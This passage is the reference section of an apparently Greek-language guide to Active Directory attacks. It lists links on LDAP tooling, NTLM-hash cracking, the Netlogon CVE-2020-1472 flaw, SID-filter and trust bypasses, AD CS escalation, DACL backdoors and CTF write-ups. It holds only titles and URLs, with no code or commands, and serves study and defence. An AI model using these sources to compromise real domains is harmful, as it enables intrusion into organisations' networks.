- [4] [Συλλογή LDAP BOF – Εργαλειοθήκη LDAP στη μνήμη για εκμετάλλευση Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Χρήση NTLM hashes ως wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Πειρατές](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Ανάλυση του Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Κατάληψη λογαριασμών Active Directory μέσω Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Διαχείριση των αλλαγών στις συνδέσεις ασφαλούς καναλιού Netlogon που σχετίζονται με το CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Ένα ταξίδι στις ξεχασμένες διεπαφές Null Session και MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Το SID filter ως όριο ασφαλείας μεταξύ τομέων; (Μέρος 4) - Έρευνα παράκαμψης SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Το SID filter ως όριο ασφαλείας μεταξύ τομέων; (Μέρος 5) - Επίθεση Golden GMSA trust - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Το SID filter ως όριο ασφαλείας μεταξύ τομέων; (Μέρος 6) - Επίθεση trust μέσω αλλαγής schema - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Από DA σε EA με ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Κλιμάκωση από admins child domain σε enterprise admins σε 5 λεπτά μέσω κατάχρησης AD CS, συνέχεια](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ένα ACE στο μανίκι: Σχεδιασμός backdoors DACL για Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Πηγαίος κώδικας του module pre2k του NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - attribute msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
